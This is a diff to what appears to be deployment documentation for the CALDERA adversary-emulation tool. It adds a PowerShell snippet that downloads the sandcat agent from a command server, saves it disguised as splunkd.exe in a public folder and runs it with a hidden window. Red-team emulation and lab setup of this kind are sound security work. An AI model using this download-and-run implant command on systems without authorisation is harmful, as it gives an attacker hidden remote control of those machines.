@@ -100,3 +100,18 @@ Copy the sandcat.exe to the target machine and run:
 Replace <CALDERA_SERVER_IP> with your server IP.
 
 The agent should appear in Agents → Windows in the CALDERA UI.
+
+
+```
+Test-NetConnection 192.168.1.47 -Port 8888
+
+$server="http://192.168.1.47:8888";
+$url="$server/file/download";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add("platform","windows");
+$wc.Headers.add("file","sandcat.go");
+$data=$wc.DownloadData($url);
+[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
+Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+
+```
